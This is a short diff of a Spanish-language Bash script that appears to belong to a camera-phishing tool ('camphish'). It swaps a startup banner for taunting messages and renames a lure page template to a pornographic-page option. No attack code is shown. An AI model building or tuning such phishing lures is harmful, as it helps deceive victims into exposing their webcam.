@@ -2,15 +2,11 @@
 clear
 echo ""
 echo ""
-echo " ESPERA UN MOMENTO POR FAVOR "
+echo "SI ESTAS LEYENDO ESTO "
 echo ""
 sleep 2
-echo " RECUERDA"
-sleep 2
-echo  "
- ____ _    _    ____    _  _ ____    ___ ____    ____ _  _ ____ 
-|___ |    |    |__|    |\ | |  |     |  |___    |__| |\/| |__| 
-|___ |___ |___ |  |    | \| |__|     |  |___    |  | |  | |  |"
+echo "ELLA NO TE AMA"
+
 sleep 3
 clear
 
@@ -146,7 +142,7 @@ banner
 camphish
 else
 printf "\n-POR DEFECTO 1-\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m PAGINA HACKING \e[0m\n"
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m PAGINA PORNO ROJO \e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m YOU TUBE\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m MEET \e[0m\n"
 default_option_template="1"
